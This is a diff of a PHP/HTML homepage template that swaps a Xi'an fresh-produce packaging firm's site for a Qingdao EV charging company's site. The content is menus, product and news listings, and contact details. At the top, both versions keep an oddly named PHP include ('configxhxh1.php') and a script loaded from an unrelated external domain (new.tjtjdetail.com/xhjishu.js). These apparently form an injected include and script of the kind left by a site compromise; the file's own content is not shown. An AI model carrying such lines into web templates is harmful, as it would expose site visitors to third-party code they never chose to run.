@@ -1,621 +1,566 @@
-<?php require 'configxhxh1.php';?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+<?php require 'data/configxhxh1.php';?>
+<!doctype html>
+<html lang="zh">
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司-水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司</title>
+<meta charset="utf-8">
+<title>青岛铭锋新能源科技有限公司</title>
 <script type="text/javascript" src="https://new.tjtjdetail.com/xhjishu.js"></script>
-<meta name="description" content="西安海宏保鲜科技有限责任公司专业主营产品：蔬菜水果保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱，实力厂家，公司办公地址坐落于西安市高新区科技路70号梧桐朗座B-703" />
-<meta name="keywords" content="水果保鲜,西安保鲜袋,西安保鲜膜,西安保鲜箱,西安保鲜盒,水果保鲜包装,蔬菜保鲜包装,果蔬保鲜包装,果蔬保鲜袋,果蔬保鲜膜,水果蔬菜保鲜袋,保鲜膜,保鲜盒,保鲜箱," />
-<meta name="author" content="order by dede58.com" />
-<meta name="viewport" content="width=1380">
-<link href="/skin/css/aos.css" rel="stylesheet">
-<link href="/skin/css/style.css" rel="stylesheet">
-<link href="/skin/css/common.css" rel="stylesheet">
-<script src="/skin/js/jquery.js"></script>
-<script src="/skin/js/jquery.superslide.2.1.1.js"></script>
-<script src="/skin/js/common.js"></script>
-<meta http-equiv="mobile-agent" content="format=xhtml;url=http://www.haihongbx.com/">
-
+<meta name="keywords" content="交流充电桩">
+<meta name="description" content="">
+<meta name="author" content="www.adminbuy.cn K92" />
+<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,shrink-to-fit=no">
+<link href="http://www.qdmfxny.cn//skin/css/bootstrap.min.css" rel="stylesheet" >
+<link href="http://www.qdmfxny.cn//skin/css/style.css" rel="stylesheet">
+<link href="http://www.qdmfxny.cn//skin/css/aos.css" rel="stylesheet">
+<link href="http://www.qdmfxny.cn//skin/css/common.css" rel="stylesheet">
+<script src="http://www.qdmfxny.cn//skin/js/jquery.js"></script>
+<script src="http://www.qdmfxny.cn//skin/js/jquery.superslide.2.1.1.js"></script>
+<script src="http://www.qdmfxny.cn//skin/js/common.js"></script>
 </head>
 <body>
 <!--顶部开始-->
-<div class="top_main">
-	<div class="top w1200 clearfix">
-		<a class="logo" href="" title="水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司-水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司" aos="fade-down" aos-easing="ease" aos-duration="700"> <img src="/skin/images/logo.png" alt=""></a>
-		<p>您好，欢迎访问西安海宏保鲜科技有限责任公司官网！</p>
-		<ul class="top_right fr">
-			<li>
-				<a href="/sitemap.html">网站地图</a>
-				<!--（<a href="" target="_blank">百度</a> / <a href="" target="_blank">谷歌</a>）-->
-			</li>
-			<li class="icon"></li>
-			<li>
-				<a id="addFavo" href="javascript:void(0);" title="">加入收藏</a>
-			</li>
-			<li class="icon"></li>
-			
-			<li class="order">
-				<a href="/a/zaixianliuyan/" title="在线留言">在线留言</a>
-			</li>
-			
-			<li class="sou">
-				<a href="javascript:void(0);" title=""><s class="icon"></s></a>
-				<div class="search">
-					<form name="formsearch" action="/search/">
-						<input type="hidden" name="kwtype" value="0" />
-						<input class="stxt" type="text" name="keyword" value="请输入关键字" onfocus="if(this.value==defaultValue)this.value=''" onblur="if(this.value=='')this.value=defaultValue" />
-						<input type="submit" class="sbtn icon" value="" />
-					</form>
-				</div>
-			</li>
-			<li class="xcx">
-				<a href="javascript:void(0);" title=""><s class="icon"></s></a>
-				<div class="imgbox"> <img src="/static/upload/image/20220222/1645528429925777.png" alt="" /><span><b>微信号：haihongbaoxiankeji</b>微信二维码</span></div>
-			</li>
-		</ul>
-	</div>
-</div>
-<!--顶部结束-->
-
-<!--页头开始-->
 <div class="header_main">
-	<div class="header w1200 clearfix">
-		<div class="slogan" aos="fade-left" aos-easing="ease" aos-duration="700"><img src="/skin/images/topimg.png" />
-			<h3>专注果蔬保鲜</h3>
-			<p>保鲜袋/保鲜膜/保鲜盒/保鲜箱</p>
-		</div>
-		<div class="webtel fr" aos="fade-left" aos-easing="ease" aos-duration="700"><span><s class="icon"></s>全国咨询热线</span><strong>177 4913 8020</strong></div>
-	</div>
+  <div class="header w1200 clearfix">
+    <ul class="ksdh fr">
+      <li class="lxwm"> <s class="icon"></s><a href="/contact/" title="联系我们">联系我们</a></li>
+      <span>|</span>
+      <li> <a class="mobile" href="javascript:;"> <s class="icon"></s>微信 </a>
+        <div class="imgbox"> <img src="/static/upload/image/20221011/1665472292544195.jpg" alt="扫一扫 联系我们"/>
+          <p> <b>微信号：</b>扫一扫 联系我们 </p>
+        </div>
+      </li>
+    </ul>
+    <span>您好，欢迎访问青岛铭锋新能源科技有限公司官网！</span> </div>
 </div>
-<!--页头结束-->
-
-<!--导航开始-->
-<div class="nav_main">
-	<ul class="list w1200 clearfix">
-		<li id="cur" class='hover'>
-			<a href="/" title="网站首页">网站首页<i></i></a>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/guanyuwomen/" title="关于我们">关于我们<i></i></a>
-			<div class="sub-box"> 
-				<a href="/a/guanyuwomen/gongsijianjie/" title="企业文化">企业文化</a>
-				<a href="/a/guanyuwomen/qiyewenhua/" title="企业技术">企业技术</a>
-				<a href="/a/guanyuwomen/gongsirongyu/" title="公司资质">公司资质</a></div>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/chanpinzhongxin/" title="产品中心">产品中心<i></i></a>
-			<div class="sub-box"> 
-				<a href="/list_6/" title="物理活化保鲜系列">物理活化保鲜系列</a>
-				<a href="/a/chanpinzhongxin/cp2/" title="微呼吸保鲜系列">微呼吸保鲜系列</a>
-				<a href="/a/chanpinzhongxin/shuiguobaoxianbaozhuang/" title="水果气调保鲜包装">水果气调保鲜包装</a>
-				<a href="/a/chanpinzhongxin/shucaibaoxianbaozhuang/" title="蔬菜气调保鲜包装">蔬菜气调保鲜包装</a></div>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/xinwendongtai/" title="新闻动态">新闻动态<i></i></a>
-			<div class="sub-box"> 
-				<a href="/a/xinwendongtai/xingyexinwen/" title="行业新闻">行业新闻</a>
-				<a href="/a/xinwendongtai/qiyexinwen/" title="企业新闻">企业新闻</a></div>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/gongchenganli/" title="保鲜机理">保鲜机理<i></i></a>
-			<div class="sub-box"> </div>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/zhaoxiannashi/" title="操作规程">操作规程<i></i></a>
-			<div class="sub-box"> </div>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/jiaruwomen/" title="加入我们">加入我们<i></i></a>
-			<div class="sub-box"> </div>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/zaixianliuyan/" title="在线留言">在线留言<i></i></a>
-			<div class="sub-box"> </div>
-		</li>
-		
-		<li 
-
->
-			<a href="/a/lianxiwomen/" title="联系我们">联系我们<i></i></a>
-			<div class="sub-box"> </div>
-		</li>
-		
-	</ul>
-</div>
-<!--导航结束--> 
-<!--幻灯片大图开始-->
-<div id="banner_main" class="banner_main" aos="fade-up" aos-easing="ease" aos-duration="700">
- <div id="banner" class="banner">
- <ul class="list clearfix">
- 
- <li><a><img src="/uploads/211104/1-211104153509363.jpg"></a></li>
- 
- <li><a><img src="/uploads/allimg/191209/1-191209151U20-L.jpg"></a></li>
- 
- <li><a><img src="/uploads/allimg/191209/1-191209151R40-L.jpg"></a></li>
- 
- </ul>
- <div class="tip"></div>
- <div class="prev"></div>
- <div class="next"></div>
- </div>
-</div>
-<!--幻灯片大图结束-->
-<div class="index"> 
- <!--产品中心开始--> 
- 
- <div class="floor_1">
- <div class="indexTit1" aos="fade-up" aos-easing="ease" aos-duration="700">
- 	
- 	
- <h3><s class="icon animate-zhuan"></s>产品中心<s class="icon animate-zhuan"></s></h3>
- 
-
- </div>
- <!--产品分类开始-->
- <ul class="tab clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
-
- <li><a href="/list_6/" title="物理活化保鲜系列">物理活化保鲜系列</a></li>
-
- <li><a href="/a/chanpinzhongxin/cp2/" title="微呼吸保鲜系列">微呼吸保鲜系列</a></li>
-
- <li><a href="/a/chanpinzhongxin/shuiguobaoxianbaozhuang/" title="水果气调保鲜包装">水果气调保鲜包装</a></li>
-
- <li><a href="/a/chanpinzhongxin/shucaibaoxianbaozhuang/" title="蔬菜气调保鲜包装">蔬菜气调保鲜包装</a></li>
-
- </ul>
- <!--产品分类结束-->
- <div class="iproduct w1200" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
- <div class="prev"></div>
- <div class="next"></div>
- <div class="iproCon">
- <ul class="prolist list clearfix">
- 
- <li class="item"><a href="/list_6/327.html" title="自发气调保鲜袋"><img src="/static/upload/image/20220818/1660806541966914.jpg" alt="自发气调保鲜袋"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>自发气调保鲜袋</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="自发气调保鲜袋"/></div>
- </a></li>
- 
- <li class="item"><a href="/list_6/326.html" title="猕猴桃保鲜技术方案"><img src="/static/upload/image/20220817/1660722478562407.png" alt="猕猴桃保鲜技术方案"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>猕猴桃保鲜技术方案</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="猕猴桃保鲜技术方案"/></div>
- </a></li>
- 
- <li class="item"><a href="/list_6/325.html" title="冬枣贮藏保鲜方案"><img src="/static/upload/image/20220817/1660721550321067.jpg" alt="冬枣贮藏保鲜方案"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>冬枣贮藏保鲜方案</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="冬枣贮藏保鲜方案"/></div>
- </a></li>
- 
- <li class="item"><a href="/list_6/113.html" title="西梅保鲜技术方案"><img src="/uploads/210928/1-21092QHQ4V2.jpg" alt="西梅保鲜技术方案"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>西梅保鲜技术方案</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="西梅保鲜技术方案"/></div>
- </a></li>
- 
- <li class="item"><a href="/list_6/117.html" title="水果保鲜包装:木瓜保鲜袋"><img src="/uploads/211108/1-21110Q64Q1P6.jpg" alt="水果保鲜包装:木瓜保鲜袋"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>水果保鲜包装:木瓜保鲜袋</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="水果保鲜包装:木瓜保鲜袋"/></div>
- </a></li>
- 
- <li class="item"><a href="/a/chanpinzhongxin/cp2/323.html" title="防雾保鲜包装"><img src="/static/upload/image/20220706/1657094348824831.png" alt="防雾保鲜包装"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>防雾保鲜包装</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="防雾保鲜包装"/></div>
- </a></li>
- 
- <li class="item"><a href="/a/chanpinzhongxin/cp2/295.html" title="水果保鲜：苹果保鲜袋"><img src="/uploads/211103/1-211103095114121.jpg" alt="水果保鲜：苹果保鲜袋"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>水果保鲜：苹果保鲜袋</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="水果保鲜：苹果保鲜袋"/></div>
- </a></li>
- 
- <li class="item"><a href="/list_6/119.html" title="水果保鲜包装：桃李杏保鲜袋"><img src="/uploads/211116/1-21111610154b15.jpg" alt="水果保鲜包装：桃李杏保鲜袋"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>水果保鲜包装：桃李杏保鲜袋</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="水果保鲜包装：桃李杏保鲜袋"/></div>
- </a></li>
- 
- <li class="item"><a href="/list_6/118.html" title="果蔬保鲜包装：乳瓜保鲜袋"><img src="/uploads/211115/1-211115095134514.jpg" alt="果蔬保鲜包装：乳瓜保鲜袋"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>果蔬保鲜包装：乳瓜保鲜袋</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="果蔬保鲜包装：乳瓜保鲜袋"/></div>
- </a></li>
- 
- <li class="item"><a href="/a/chanpinzhongxin/89.html" title="水果保鲜包装：猕猴桃保鲜盒"><img src="/uploads/211112/1-21111216201O96.jpg" alt="水果保鲜包装：猕猴桃保鲜盒"/>
- <h3><span class="fr"><s class="icon"></s>在线预定</span>水果保鲜包装：猕猴桃保鲜盒</h3>
- <div class="xcx"><span>扫码预定</span><img src="/static/upload/image/20220222/1645528429925777.png" alt="水果保鲜包装：猕猴桃保鲜盒"/></div>
- </a></li>
- 
- </ul>
- </div>
- </div>
- </div>
-
- <!--产品中心结束--> 
- 
- <!--小banner开始-->
- <div class="xunpan">
- <div class="w1200 por clearfix">
- <div class="zixun fr" aos="fade-left" aos-easing="ease" aos-duration="700"><img class="ewm fr" src="/skin/images/erweima.png" alt="水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司-水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司"/>
- <div class="tel"><s class="icon animate-tel"></s>177 4913 8020</div>
- <div class="zx">扫码立即预定尝鲜<s class="icon"></s></div>
- </div>
- <p class="bigtxt" aos="fade-up" aos-easing="ease" aos-duration="700">专注果蔬保鲜，<b>只为原生态的自然美味！</b></p>
- <p aos="fade-up" aos-easing="ease" aos-duration="700">从果园产地到您的手中，全程保鲜护航，保证果蔬的自然美味</p>
- </div>
- </div>
- <!--小banner结束--> 
- 
- <!--5大优势开始-->
- <div class="floor_2">
- <div class="w1200"> 
- <div class="indexTit2">
- <h3 aos="fade-up"></h3>
- <div class="txt" aos="fade-up" aos-delay="100"><span class="en">FIVE APPLICATION SCENARIOS OF HAIHONG FRESH-KEEPING</span><span class="num">应用</span><span class="t">场景</span></div>
- </div>
- 
- <div class="iadvan">
- <div class="bigimg" aos="zoom-in" aos-delay="100"><img src="/skin/images/ys.jpg"/></div>
- <ul class="list">
- 
- <li class="a1" aos="fade-right" aos-delay="200">
- <h3><span>01</span>电商</h3>
- <p>生鲜配送、生态园采摘果保鲜</p>
- <img src="/skin/images/ys1.png"/></li>
-  
- 
- <li class="a2" aos="fade-right" aos-delay="200">
- <h3><span>02</span>商超</h3>
- <p>销售中果蔬保鲜，保证果蔬品质，更安心！</p>
- <img src="/skin/images/ys2.png"/></li>
- 
- 
- <li class="a3" aos="fade-right" aos-delay="200">
- <h3><span>03</span>果库存储</h3>
- <p>食品级保鲜技术，全程保鲜护航</p>
- <img src="/skin/images/ys3.png"/></li>
- 
- 
- <li class="a4" aos="fade-right" aos-delay="200">
- <h3><span>04</span>流水线包装</h3>
- <p>果蔬肉类等食物，可延长保鲜期</p>
- <img src="/skin/images/ys4.png"/></li>
- 
- 
- <li class="a5" aos="fade-right" aos-delay="200">
- <h3><span>05</span>进出口、舰船补给</h3>
- <p>保证果蔬远程运输中的鲜美</p>
- <img src="/skin/images/ys5.png"/></li>
- 
- </ul>
- </div>
- </div>
- </div>
- <!--5大优势结束--> 
- 
- <!--4大特色开始-->
- <div class="floor_3"> 
- <div class="indexTit2">
- <h3 aos="fade-up"></h3>
- <div class="txt" aos="fade-up" aos-delay="100"><span class="en">OUR PRODUCT FEATURES</span><span class="t">我们产品</span><span class="num">特色</span></div>
- </div>
- 
- <ul class="ifeat w1200 clearfix">
- 
- <li class="item a1" aos="fade-up" aos-delay="100"><span class="line"></span>
- <div class="txtcon"><s></s>
- <h3>物理保鲜</h3>
- <span class="en">[field:typenameen/]</span>
- <div class="txt">纯物理保鲜技术，果蔬更新鲜，口感更自然</div>
- </div>
- </li>
-  
- 
- <li class="item a2" aos="fade-up" aos-delay="100"><span class="line"></span>
- <div class="txtcon"><s></s>
- <h3>延长保质期</h3>
- <span class="en">[field:typenameen/]</span>
- <div class="txt">延缓果蔬衰老，延长货架期</div>
- </div>
- </li>
- 
- 
- <li class="item a3" aos="fade-up" aos-delay="100"><span class="line"></span>
- <div class="txtcon"><s></s>
- <h3>提升竞争力</h3>
- <span class="en">[field:typenameen/]</span>
- <div class="txt">实现果蔬错峰销售、提升果蔬鲜品价值，加强市场竞争优势</div>
- </div>
- </li>
- 
- 
- <li class="item a4" aos="fade-up" aos-delay="100"><span class="line"></span>
- <div class="txtcon"><s></s>
- <h3>品质保证</h3>
- <span class="en">[field:typenameen/]</span>
- <div class="txt">保证食品安全健康，减少消耗、降低运输成本</div>
- </div>
- </li>
- 
- </ul>
- </div>
- <!--4大特色结束--> 
- 
- <!--基地展示开始--> 
- <!-- {dede:channelartlist typeid='15,15'}
- <div class="floor_4">
- <div class="indexTit1" aos="fade-up" aos-easing="ease" aos-duration="700">
- <h3><s class="icon animate-zhuan"></s><s class="icon animate-zhuan"></s></h3>
- </div>
- <div class="ibase w1200" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
- <div class="prev"></div>
- <div class="next"></div>
- <div class="ibaseCon">
- <ul class="baselist list clearfix">
- 
- </ul>
- </div>
- </div>
- <a aos="fade-up" href="/" title="查看更多>>" class="indexMore">查看更多>></a></div>
- {/dede:channelartlist} -->
- <!--基地展示结束--> 
- 
- <!--小banner开始-->
- <div class="xunpan">
- <div class="w1200 por clearfix">
- <div class="zixun fr" aos="fade-left" aos-easing="ease" aos-duration="700"><img class="ewm fr" src="/skin/images/erweima.png" alt="水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司-水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司"/>
- <div class="tel"><s class="icon animate-tel"></s>177 4913 8020</div>
- <div class="zx">扫码立即预定尝鲜<s class="icon"></s></div>
- </div>
- <p class="bigtxt" aos="fade-up" aos-easing="ease" aos-duration="700">专注果蔬保鲜，<b>只为原生态的自然美味！</b></p>
- <p aos="fade-up" aos-easing="ease" aos-duration="700">从果园产地到您的手中，全程保鲜护航，保证果蔬的自然美味</p>
- </div>
- </div>
- <!--小banner结束--> 
- 
- <!--新闻动态开始--> 
-
- <div class="floor_5">
- <div class="w1200">
- <div class="indexTit1" aos="fade-up" aos-easing="ease" aos-duration="700">
- 	
- 	
- <h3><s class="icon animate-zhuan"></s>关于我们<s class="icon animate-zhuan"></s></h3>
- 
-
- 
- </div>
- <div class="inews clearfix"> 
- <!--推荐内容开始-->
- <div class="imgleft" id="inews" aos="fade-right" aos-delay="200" aos-duration="700">
- <ul class="list">
- 
- <li class="item"><a href="/a/xinwendongtai/qiyexinwen/335.html" title="杏鲍菇保鲜"><img src="/static/upload/image/20231101/1698823872498421.jpg" alt="杏鲍菇保鲜"/>
- <div class="txtcon">
- <h3><span class="fr time">2023-11-01</span>杏鲍菇保鲜</h3>
- <div class="txt">杏鲍菇保鲜采用 TiO2和 SiO2复合纳米薄膜保鲜袋真空包装杏鲍菇，能够长时间的保持食品的营养成分、风味和品质，防止微生物的入侵，从而避免风味成分过度氧化或降解，有效保持杏鲍菇贮藏期间的风味品质。杏鲍菇采收后预冷后，选取菇体完整、直径大小均一、表面光洁、无病虫害、长度均匀的中等大小的...</div>
- </div>
- </a></li>
- 
- <li class="item"><a href="/a/xinwendongtai/xingyexinwen/334.html" title="杏鲍菇保鲜"><img src="/static/upload/image/20230703/1688375466664442.png" alt="杏鲍菇保鲜"/>
- <div class="txtcon">
- <h3><span class="fr time">2023-07-03</span>杏鲍菇保鲜</h3>
- <div class="txt">本文选自2022-12-30《食品工业科技》网络首发论文：《纳米薄膜真空包装杏鲍菇在贮藏中的风味品质变化》试验方案试验目的为延长杏鲍菇在纳米薄膜真空包装的保质期，将杏鲍菇的采后鲜品置;TiO2;和 SiO2;复合纳米薄膜保鲜袋，于 0.07 MPa真空预冷至+4℃以下，+2℃冷库中贮藏；定期采样测试游离氨基酸，并采用 HS-SPME-GC-MS 测...</div>
- </div>
- </a></li>
- 
- <li class="item"><a href="/a/xinwendongtai/xingyexinwen/333.html" title="包装演进：水果包装创新发展论坛探索未来之路"><img src="/static/upload/image/20230615/1686796815144833.jpeg" alt="包装演进：水果包装创新发展论坛探索未来之路"/>
- <div class="txtcon">
- <h3><span class="fr time">2023-06-15</span>包装演进：水果包装创新发展论坛探索未来之路</h3>
- <div class="txt">在当今全球关注可持续发展的背景下，水果包装行业的创新和发展变得尤为重要。为了探讨最新的包装技术、设计理念和可持续发展实践经验，由秉信包装主办，iFresh亚果会承办的2023第一届中国水果包装创新发展论坛5月29日在西安成功举办。本次论坛的主题是“秉信包装 创新先行 绿色助农”。 本次论坛汇...</div>
- </div>
- </a></li>
- 
- <li class="item"><a href="/a/xinwendongtai/xingyexinwen/332.html" title="樱桃季，您做好樱桃保鲜了吗？"><img src="/static/upload/image/20230516/1684201250146132.png" alt="樱桃季，您做好樱桃保鲜了吗？"/>
- <div class="txtcon">
- <h3><span class="fr time">2023-05-16</span>樱桃季，您做好樱桃保鲜了吗？</h3>
- <div class="txt">樱桃保鲜...</div>
- </div>
- </a></li>
- 
- <li class="item"><a href="/a/xinwendongtai/qiyexinwen/331.html" title="香蕉精品天然 源自物理保鲜"><img src="/static/upload/image/20230404/1680577488132691.jpg" alt="香蕉精品天然 源自物理保鲜"/>
- <div class="txtcon">
- <h3><span class="fr time">2023-04-04</span>香蕉精品天然 源自物理保鲜</h3>
- <div class="txt">香蕉如何保鲜？香蕉是一种典型的呼吸跃变型水果，当呼吸达到高峰值以后，一旦启动了“成熟开关”，香蕉变熟就势不可挡，只需很短的时间就会熟透甚至腐烂。如何做好香蕉的保鲜呢？今天海宏保鲜给大家分享一个视频，赶紧跟着小编来看看吧！香蕉保鲜试验试验过程选两串成熟度相同的香蕉，分别装入普通保鲜袋和海宏保鲜袋，置于...</div>
- </div>
- </a></li>
- 
- </ul>
- <div class="tip"></div>
- </div>
- <!--推荐内容结束-->
- <div class="newslist" aos="fade-left" aos-delay="200" aos-duration="700"> 
- <div class="item"><a href="/list_6/327.html" title="自发气调保鲜袋">
- <h3 ><s class="icon"></s>自发气调保鲜袋</h3>
- <div class="txt">水果自发气调物理活化保鲜袋冷库用气调贮藏保鲜包装规格：45×30，60×45,60×70，···...</div>
- <span class="time">2022-08-17</span></a></div>
- 
- <div class="item"><a href="/list_6/326.html" title="猕猴桃保鲜技术方案">
- <h3 ><s class="icon"></s>猕猴桃保鲜技术方案</h3>
- <div class="txt">猕猴桃保鲜新技术锁 / 住 / 新 / 鲜/🥝/ 关 / 爱 / 健 / 康什么样的物理保···...</div>
- <span class="time">2022-08-17</span></a></div>
- 
- <div class="item"><a href="/list_6/325.html" title="冬枣贮藏保鲜方案">
- <h3 ><s class="icon"></s>冬枣贮藏保鲜方案</h3>
- <div class="txt">冬枣的生理特性鲜枣特点鲜枣为品质优良的鲜食品种 ,色泽艳丽 ,光亮悦目 ,皮薄肉细 ,入口···...</div>
- <span class="time">2022-08-17</span></a></div>
- 
- <div class="item"><a href="/list_6/113.html" title="西梅保鲜技术方案">
- <h3 ><s class="icon"></s>西梅保鲜技术方案</h3>
- <div class="txt">水果保鲜包装 西梅保鲜袋 西梅因为是时效性水果，西梅一般很难保存，但使用西安海宏保鲜 PB···...</div>
- <span class="time">2022-08-17</span></a></div>
+<!--顶部结束--> 
+<!--头部开始-->
+<div class="top_main">
+  <div class="top w1200 clearfix">
+    <div class="logo fl" aos="fade-right" aos-easing="ease" aos-duration="700"> <a href="http://www.qdmfxny.cn//" title="青岛铭锋新能源科技有限公司"> <img src="/static/upload/image/20221011/1665469302104768.jpg" alt="青岛铭锋新能源科技有限公司"> </a> </div>
+    <div class="webtel fr" aos="fade-left" aos-easing="ease" aos-duration="700"> <span class="icon"></span> <b>18661734618</b> </div>
   </div>
- </div>
-
- <a aos="fade-up" href="/a/chanpinzhongxin/" title="查看更多>>" class="indexMore">查看更多>></a> </div>
-
- 
- </div>
-
- <!--新闻动态结束--> 
+  <!--导航开始-->
+  <div id="nav" class="nav">
+    <ul class="navlist w1200 clearfix">
+      <li id="cur"  class="hover"><a href="http://www.qdmfxny.cn//" title="网站首页">网站首页</a></li>
+      
+      <li class=''>
+      <a href="/about/" title="关于我们">关于我们</a>
+      <div class="subnav"> 
+         <a href="/wenhua/" title="企业文化">企业文化</a>  <a href="/jiaru/" title="加入我们">加入我们</a>  <a href="/wangluo/" title="销售网络">销售网络</a> 
+         </div>
+      </li>
+      
+      <li class=''>
+      <a href="/news/" title="新闻中心">新闻中心</a>
+      <div class="subnav"> 
+         <a href="/company/" title="公司动态">公司动态</a>  <a href="/industry/" title="行业动态">行业动态</a> 
+         </div>
+      </li>
+      
+      <li class=''>
+      <a href="/product/" title="产品中心">产品中心</a>
+      <div class="subnav"> 
+         <a href="/lm1/" title="交流充电桩">交流充电桩</a>  <a href="/lm2/" title="直流充电桩">直流充电桩</a> 
+         </div>
+      </li>
+      
+      <li class=''>
+      <a href="/case/" title="服务案例">服务案例</a>
+      <div class="subnav">  </div>
+      </li>
+      
+      <li class=''>
+      <a href="/kehu/" title="客户服务">客户服务</a>
+      <div class="subnav">  </div>
+      </li>
+      
+      <li class=''>
+      <a href="/liuyan/" title="在线留言">在线留言</a>
+      <div class="subnav">  </div>
+      </li>
+      
+      <li class=''>
+      <a href="/contact/" title="联系我们">联系我们</a>
+      <div class="subnav">  </div>
+      </li>
+      
+    </ul>
+  </div>
+  <!--导航结束--> 
 </div>
-<!--页尾开始-->
-<div class="footer_main">
- <div class="w1200">
- <div class="clearfix" aos="fade-up" aos-easing="ease" aos-duration="700"> 
- <!--友情链接开始-->
- <div class="links"> <span>友情链接：</span>  </div>
- <!--友情链接结束--> 
- 
- <!--底部导航开始-->
- <ul class="botnav fl">
- <li><a href="/" title="网站首页">网站首页</a>
- <div class="drop clearfix"> 
- 	
-<a href="/a/guanyuwomen/" title="关于我们">关于我们</a> <a href="/a/chanpinzhongxin/" title="产品中心">产品中心</a> <a href="/a/xinwendongtai/" title="新闻动态">新闻动态</a> <a href="/a/gongchenganli/" title="保鲜机理">保鲜机理</a> <a href="/a/zhaoxiannashi/" title="操作规程">操作规程</a> <a href="/a/jiaruwomen/" title="加入我们">加入我们</a> <a href="/a/zaixianliuyan/" title="在线留言">在线留言</a> <a href="/a/lianxiwomen/" title="联系我们">联系我们</a> 
- 
- 
- 
- </div>
- </li>
+<!--头部结束--> 
+
+<!--占位导航栏--> 
+<!--<div style="height:71px;" class="head-sm-height"></div>--> 
 
  
- 
- <li><a href="/a/chanpinzhongxin/" title="产品中心">产品中心</a>
- <div class="drop clearfix"> 
- 	
- 	 <a href="/list_6/" title="物理活化保鲜系列">物理活化保鲜系列</a> 
- 	
- <a href="/a/chanpinzhongxin/cp2/" title="微呼吸保鲜系列">微呼吸保鲜系列</a> 
- 	
- <a href="/a/chanpinzhongxin/shuiguobaoxianbaozhuang/" title="水果气调保鲜包装">水果气调保鲜包装</a> 
- 	
- <a href="/a/chanpinzhongxin/shucaibaoxianbaozhuang/" title="蔬菜气调保鲜包装">蔬菜气调保鲜包装</a> 
- 	
-
- 
- </div>
- </li>
-
- </ul>
- <!--底部导航结束--> 
- 
- <!--联系我们开始-->
- 
- <div class="botcontcat"> <a href="/a/xinwendongtai/qiyexinwen/" title="企业新闻">企业新闻</a>
- <div class="drop clearfix">24小时服务热线
- <p class="tel">177 4913 8020</p>
- <span>邮箱：18991991529@vip.163.com</span></div>
- </div>
- 
- <!--联系我们结束--> 
- <script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?0ff857e66b7a6737579d07686086e09d";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
-</script>
- <!--二维码开始-->
- <div class="bewm"> <img src="/static/upload/image/20220222/1645528429925777.png" alt="水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司-水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司"/>
- <p>扫描二维码<br />
- 立即预约尝鲜</p>
- </div>
- <!--二维码结束--> 
- <!--在线留言开始-->
- <div class="imsgbox fr">
- <h3>在线留言</h3>
- <div class="imassge clearfix">
- <form class="foot_book" action="/form/2/" enctype="multipart/form-data" method="post" onsubmit="return checkForm();">
- <input type="hidden" name="action" value="post" />
- <input type="hidden" name="diyid" value="1" />
- <input type="hidden" name="do" value="2" />
- <div class="item mr10">
